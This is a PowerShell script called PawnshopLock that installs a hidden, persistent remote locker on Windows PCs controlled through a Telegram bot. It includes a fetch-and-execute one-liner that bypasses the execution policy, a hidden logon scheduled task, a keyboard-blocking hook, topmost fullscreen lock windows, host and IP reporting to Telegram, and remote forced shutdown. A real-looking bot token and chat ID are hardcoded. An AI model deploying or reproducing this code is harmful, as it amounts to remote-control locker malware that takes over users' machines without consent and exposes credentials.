# =============================================================
# PawnshopLock  v5.1  –  Single File  (Installer + Persistent Listener)
# -------------------------------------------------------------
# 1️⃣  Run ONCE (preferably as Admin):
#     powershell -w hidden -ep Bypass -Command "iwr https://raw.githubusercontent.com/diezul/x/main/pawnlock.ps1 | iex"
# 2️⃣  Script copies itself to  C:\ProgramData\PawnshopLock\pawnlock.ps1
#     and registers a Scheduled Task that starts **unlocked** at every log‑on.
# 3️⃣  Telegram commands (case‑insensitive):
#       /lock<username>      → fullscreen lock, block keyboard
#       /unlock<username>    → hide lock (or press local 'C')
#       /shutdown<username>  → shutdown any time
# =============================================================
param([string]$Mode = 'install')

# ------------ USER CONFIG (edit only these if needed) ------------------
$imageURL = 'https://raw.githubusercontent.com/diezul/x/main/1.png'
$botToken = '7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co'
$chatID   = '656189986'
# ----------------------------------------------------------------------
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$taskName   = 'PawnshopLockService'
$installDir = "$env:ProgramData\PawnshopLock"
$selfPath   = "$installDir\pawnlock.ps1"     # persistent copy of this file
$user       = $env:USERNAME
$pc         = $env:COMPUTERNAME
$lockCmd    = "/lock$user".ToLower()
$unlockCmd  = "/unlock$user".ToLower()
$shutCmd    = "/shutdown$user".ToLower()

# ----------------------------------------------------------------------
function TG([string]$msg){
  try{
    @{chat_id=$chatID;text=$msg}|ConvertTo-Json -Compress | Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -ContentType 'application/json' -TimeoutSec 10
  }catch{}
}

#########################################################################
#  ============ SERVICE (listener)  ====================================
#########################################################################
function Start-Listener {
  $tempImg = "$env:TEMP\\pawnlock.jpg"
  try{ Invoke-WebRequest $imageURL -OutFile $tempImg -UseBasicParsing }catch{}

  Add-Type -AssemblyName System.Windows.Forms,System.Drawing
  Add-Type @'
using System;using System.Runtime.InteropServices;using System.Windows.Forms;
public class KeyBlocker{static IntPtr h=IntPtr.Zero;delegate IntPtr P(int n,IntPtr w,IntPtr l);static P d=Hook;const int WH=13,WM1=0x100,WM2=0x104;[DllImport("user32.dll")]static extern IntPtr SetWindowsHookEx(int id,P cb,IntPtr m,uint t);[DllImport("user32.dll")]static extern bool UnhookWindowsHookEx(IntPtr h);[DllImport("user32.dll")]static extern IntPtr CallNextHookEx(IntPtr h,int n,IntPtr w,IntPtr l);[DllImport("kernel32.dll")]static extern IntPtr GetModuleHandle(string n);
public static void Block(){ if(h==IntPtr.Zero) h=SetWindowsHookEx(WH,d,GetModuleHandle(null),0);} public static void Unblock(){ if(h!=IntPtr.Zero){UnhookWindowsHookEx(h);h=IntPtr.Zero;} }
static IntPtr Hook(int n,IntPtr w,IntPtr l){ if(n>=0&&(w==(IntPtr)WM1||w==(IntPtr)WM2)){ int vk=System.Runtime.InteropServices.Marshal.ReadInt32(l); if(vk==0x43) return CallNextHookEx(h,n,w,l); return (IntPtr)1;} return CallNextHookEx(h,n,w,l);} }
'@

  $forms = $null
  function Show-Lock {
    if($forms){ return }
    [KeyBlocker]::Block()
    $forms = @()
    foreach($s in [Windows.Forms.Screen]::AllScreens){
      $f = New-Object Windows.Forms.Form -Property @{FormBorderStyle='None';WindowState='Maximized';StartPosition='Manual';TopMost=$true;Location=$s.Bounds.Location;Size=$s.Bounds.Size;BackColor='Black';KeyPreview=$true}
      # load image safely
      try{ $img=[Drawing.Image]::FromFile($tempImg) }catch{ $img=$null }
      if($img){ $pb = New-Object Windows.Forms.PictureBox -Property @{Image=$img;Dock='Fill';SizeMode='StretchImage'}; $f.Controls.Add($pb) }
      $f.Add_Deactivate({ $_.Activate() })
      $f.Add_KeyDown({ if($_.KeyCode -eq 'C'){ Hide-Lock }; $_.Handled=$true })
      $f.Show(); $forms += $f
    }
    TG "🔒 $pc locked."
  }
  function Hide-Lock {
    if(!$forms){ return }
    foreach($f in $forms){ try{ $f.Close() }catch{} }
    $forms = $null
    [KeyBlocker]::Unblock()
    TG "🔓 $pc unlocked."
  }

  function IPs {
    try{ (Get-NetIPAddress -AddressFamily IPv4 | Where-Object{ $_.IPAddress -notmatch '^(127|169\.254|0\.|255)' })[0].IPAddress }
    catch{ 'n/a' }
  }

  TG "✅ Service online on $pc ($user). IPs: $(IPs())`nCmds: $lockCmd $unlockCmd $shutCmd"

  $offset = 0
  while($true){
    try{
      $u=Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?timeout=25&offset=$offset" -TimeoutSec 30
      foreach($m in $u.result){
        $offset = $m.update_id + 1
        if($m.message.chat.id -ne [int]$chatID){ continue }
        $txt = $m.message.text.ToLower()
        switch($txt){
          {$_ -eq $lockCmd}   { Show-Lock; break }
          {$_ -eq $unlockCmd} { Hide-Lock; break }
          {$_ -eq $shutCmd}   { TG "⏹ Shutting down $pc"; Stop-Computer -Force }
        }
      }
    }catch{ Start-Sleep 5 }
  }
}

#########################################################################
#  ============ INSTALLER (default mode) ===============================
#########################################################################
if($Mode -eq 'install'){
  # 1. persist script locally
  New-Item -ItemType Directory -Path $installDir -Force | Out-Null
  Get-Content -Raw -Path $PSCommandPath | Set-Content -Path $selfPath -Encoding UTF8

  # 2. register scheduled task
  $action  = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument @('-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File',$selfPath,'run')
  $trigger = New-ScheduledTaskTrigger -AtLogOn
  $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
  try{
    if($isAdmin){ Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Highest -Force }
    else         { Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Force             }
  }catch{}

  TG "🛠 Installed on $pc, starting listener"
  Start-Process powershell.exe -WindowStyle Hidden -ArgumentList @('-ExecutionPolicy','Bypass','-File',$selfPath,'run')
  return
}

#########################################################################
#  ============ RUN MODE ===============================================
#########################################################################
Start-Listener
